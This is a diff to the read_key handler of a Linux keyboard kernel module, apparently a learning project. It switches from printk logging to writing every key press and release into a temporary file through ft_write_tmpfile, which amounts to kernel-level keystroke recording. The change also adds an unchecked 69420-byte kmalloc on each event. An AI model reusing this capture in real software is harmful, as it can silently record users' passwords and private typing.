@@ -18,37 +18,39 @@ void read_key(struct work_struct *workqueue)
 	int scancode = inb(KB_PORT);
 	int is_pressed = 1;
 	ft_key key;
+	char *output_str;
 
 	queue_data *q_data = container_of(workqueue, queue_data, worker);
 
 	// event creation
 	event_struct *event = ft_generate_event(*q_data, scancode);
 
-	if (event->is_pressed){
-		printk("%s is pressed\n", event->name);
-	}
-	else{
-		printk("%s is released\n", event->name);
-	}
+	// if (event->is_pressed){
+	// 	printk("%s is pressed\n", event->name);
+	// }
+	// else{
+	// 	printk("%s is released\n", event->name);
+	// }
 
 
 	// event storing
-	if (!&(event->list))
-	{
-		printk("no event list\n");
-		return ;
-	}
-	if (!&(q_data->driver.events_head->list))
-	{
-		printk("q_data->driver.events_head->list\n");
-		return ;
-	}
 	list_add_tail(&(event->list), &(q_data->driver.events_head->list));
 
 
 	// post processing (shift, caps) 
 
+	output_str = kmalloc(69420, GFP_KERNEL);
 	// output
+	if (event->is_pressed){
+		sprintf(output_str, "%s is pressed\n", event->name);
+		// printk("%s is pressed\n", event->name);
+	}
+	else{
+		sprintf(output_str, "%s is released\n", event->name);
+		// printk("%s is released\n", event->name);
+	}
+	ft_write_tmpfile(output_str);
+	kfree(output_str);
 	// printk("WQ SCANCODE %x\n", scancode);
 }
 
